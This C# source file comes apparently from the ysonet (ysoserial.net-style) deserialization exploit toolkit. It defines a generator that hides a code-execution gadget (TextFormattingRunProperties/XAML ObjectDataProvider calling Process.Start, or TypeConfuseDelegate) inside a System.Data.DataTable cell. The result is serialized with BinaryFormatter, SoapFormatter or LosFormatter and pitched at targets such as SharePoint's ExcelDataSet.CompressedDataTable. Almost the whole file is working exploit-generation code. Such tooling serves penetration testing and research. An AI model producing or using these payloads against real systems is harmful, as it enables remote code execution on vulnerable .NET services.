using NDesk.Options;
using System;
using System.Collections.Generic;
using System.Data;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /*
     * DataTable payload carrier.
     *
     * A System.Data.DataTable with RemotingFormat = SerializationFormat.Binary can
     * hold an arbitrary object in an "object" column. The outer formatter serializes
     * and later deserializes that cell as part of the SAME object graph, so a live
     * inner gadget placed in the cell fires on deserialize.
     *
     * This is a same-graph ROOT CARRIER, not a new sink. A standalone DataTable
     * stores its row values inline in its own SerializationInfo (the
     * "DataTable_N.Records" ArrayList in DataTable.SerializeTableData), so the same
     * outer formatter serializes and deserializes both the DataTable and the inner
     * gadget. Unlike the DataSet gadget it opens NO nested BinaryFormatter and NO new
     * binder boundary.
     *
     * Verified against the .NET Framework System.Data source: DataSet builds a fresh
     * "new BinaryFormatter(...)" per table on both serialize and deserialize
     * (DataSet.cs), while DataTable uses no BinaryFormatter at all and reads its rows
     * back with info.GetValue("DataTable_N.Records", typeof(ArrayList)). So the two are
     * genuinely different: DataSet is a nested-formatter bridge, DataTable is a carrier.
     *
     * Useful when a target requires or casts the deserialized root object to DataTable,
     * for example SharePoint's ExcelDataSet.CompressedDataTable. Microsoft treats
     * deserializing a DataTable with an unsafe formatter as a full remote code execution
     * risk (analyzer CA2362 and the DataSet/DataTable security guidance).
     *
     * The inner gadget is selectable via the var/variant option:
     *   Variant 1 (default): TextFormattingRunProperties (XAML ObjectDataProvider ->
     *     Process.Start), which needs the Microsoft.PowerShell.Editor assembly and WPF.
     *     Supports BinaryFormatter, SoapFormatter and LosFormatter.
     *   Variant 2: TypeConfuseDelegate, a framework built-in inner that needs no WPF or
     *     Microsoft.PowerShell.Editor. Its gadget object is a generic SortedSet<string>,
     *     and SoapFormatter cannot serialize a generic type, so variant 2 supports
     *     BinaryFormatter and LosFormatter only.
     * Variant 1 stays the default so -g DataTable keeps producing the same payload it did
     * before the variant was added.
     *
     * James Forshaw's "Are You My Type?" (Black Hat 2012) documents the related but
     * DISTINCT DataSet nested-BinaryFormatter bridge, not this DataTable carrier:
     * https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf
     */
    public class DataTableGenerator : GenericGenerator
    {
        // Discovery facets (category search only): this is the DEFAULT variant 1. The
        // complete payload runs code via the inner TextFormattingRunProperties gadget
        // (XAML ObjectDataProvider). That inner gadget needs Microsoft.PowerShell.Editor
        // (extra assembly) and WPF, so variant 1 is NOT BuiltIn. No nested formatter is
        // used, so the kind is code-execution, not nested-deserialization, and there is no
        // Bridged label. Variant 2 (TypeConfuseDelegate) is framework built-in and declares
        // its own facet override in Variants().
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.CodeExecution)
                .WithRequirements(
                    GadgetRequirement.ExtraAssembly,
                    GadgetRequirement.Wpf,
                    GadgetRequirement.NetFramework);
        }

        public override string Finders()
        {
            return "Soroush Dalili";
        }

        public override string AdditionalInfo()
        {
            return "Same-graph System.Data.DataTable root carrier: the inner "
                + "TextFormattingRunProperties gadget travels in an object column and is "
                + "deserialized by the same outer formatter. A standalone DataTable stores "
                + "its rows inline in its own SerializationInfo (DataTable_N.Records), so "
                + "unlike the DataSet gadget it opens no nested BinaryFormatter and no new "
                + "binder boundary (verified against the System.Data source). Useful when a "
                + "target requires or casts the deserialized root object to DataTable, for "
                + "example SharePoint's ExcelDataSet.CompressedDataTable. Microsoft treats "
                + "deserializing a DataTable with an unsafe formatter as a full remote code "
                + "execution risk (CA2362, DataSet/DataTable security guidance). The inner "
                + "gadget is selectable with var/variant: 1 (default) TextFormattingRunProperties, "
                + "which needs the Microsoft.PowerShell.Editor assembly and WPF and supports "
                + "BinaryFormatter, SoapFormatter and LosFormatter; 2 TypeConfuseDelegate, a "
                + "framework built-in that needs no WPF or Microsoft.PowerShell.Editor but, being "
                + "a generic SortedSet, supports BinaryFormatter and LosFormatter only (no "
                + "SoapFormatter). Forshaw's 'Are You My Type?' (Black Hat 2012) documents the "
                + "related but distinct DataSet nested-BinaryFormatter bridge.";
        }

        public override List<string> Labels()
        {
            // Empty on purpose: GadgetTags.Variant means "this gadget is itself a variant
            // of another gadget", which DataTable is not. Having a var/variant selector does
            // not warrant that tag (see the note on GadgetTags.Variant).
            return new List<string>();
        }

        private int variant_number = 1; // Default: TextFormattingRunProperties inner

        public override List<GadgetVariant> Variants()
        {
            return new List<GadgetVariant>
            {
                new GadgetVariant(1, "TextFormattingRunProperties inner (default)"),
                // Variant 2 wraps TypeConfuseDelegate, whose gadget object is a generic
                // SortedSet<string>. SoapFormatter cannot serialize a generic type, so this
                // variant opts out of SoapFormatter. It is framework built-in (no WPF, no
                // Microsoft.PowerShell.Editor), so it declares its own facet override.
                new GadgetVariant(2, "TypeConfuseDelegate inner (built-in, no WPF)")
                    .Without(Formatters.SoapFormatter)
                    .WithFacets(new GadgetFacetSet()
                        .WithKinds(PayloadKind.CodeExecution)
                        .WithRequirements(GadgetRequirement.BuiltIn,
                            GadgetRequirement.NetFramework))
            };
        }

        public override OptionSet Options()
        {
            return new OptionSet
            {
                {
                    "var|variant=",
                    "Inner gadget: 1 -> TextFormattingRunProperties [default], "
                        + "2 -> TypeConfuseDelegate (built-in, no WPF, BinaryFormatter/LosFormatter only)",
                    v => int.TryParse(v, out variant_number)
                }
            };
        }

        // These three are the complete achievable set, not an arbitrary pick. The gadget
        // carries a LIVE ISerializable object in an object column, so only the runtime
        // formatters that honor ISerializable and can serialize an arbitrary object graph
        // can deliver it. Every XML serializer fails the same way (verified empirically):
        // NetDataContractSerializer, DataContractSerializer, and XmlSerializer all throw
        // "does not implement IXmlSerializable" because DataTable requires object-typed
        // column cells to implement IXmlSerializable, which a normal gadget object does not.
        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                Formatters.BinaryFormatter,
                Formatters.SoapFormatter,
                Formatters.LosFormatter
            };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            // Reject an impossible variant+formatter pair (variant 2 + SoapFormatter)
            // with a clear message instead of a deep framework exception.
            GuardVariantFormatter(variant_number, formatter);

            // Live [Serializable] inner gadget object (not bytes), placed straight into
            // the DataTable cell so it rides the same outer object graph. Variant 2 uses
            // the built-in TypeConfuseDelegate inner; any other value falls back to the
            // default TextFormattingRunProperties inner.
            object inner = variant_number == 2
                ? TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(inputArgs)
                : TextFormattingRunPropertiesGenerator
                    .TextFormattingRunPropertiesGadget(inputArgs);

            DataTable table = new DataTable("x");
            table.RemotingFormat = SerializationFormat.Binary; // binary remoting: object cells travel in the graph
            table.Columns.Add("x", typeof(object));
            table.Rows.Add(new object[] { inner });
            table.AcceptChanges(); // commit the row so it serializes with a stable record layout

            // BinaryFormatter and LosFormatter minification uses a custom minifying
            // formatter that cannot serialize a live System.Data.DataTable (it throws
            // NullReference on the DataTable object graph). For those two, minify only
            // the inner TFRP XAML (already done above via inputArgs.Minify) and serialize
            // the outer table with the standard formatter. The XAML is the bulk of the
            // payload, so this still shrinks it. SoapFormatter minifies its XML output
            // (XmlMinifier), which works fine on a DataTable, so it keeps full minification.
            InputArgs outerArgs = inputArgs;
            if (inputArgs.Minify
                && (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                    || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)))
            {
                outerArgs = inputArgs.DeepCopy();
                outerArgs.Minify = false;
            }

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("soapformatter", StringComparison.OrdinalIgnoreCase))
            {
                return Serialize(table, formatter, outerArgs);
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }
}
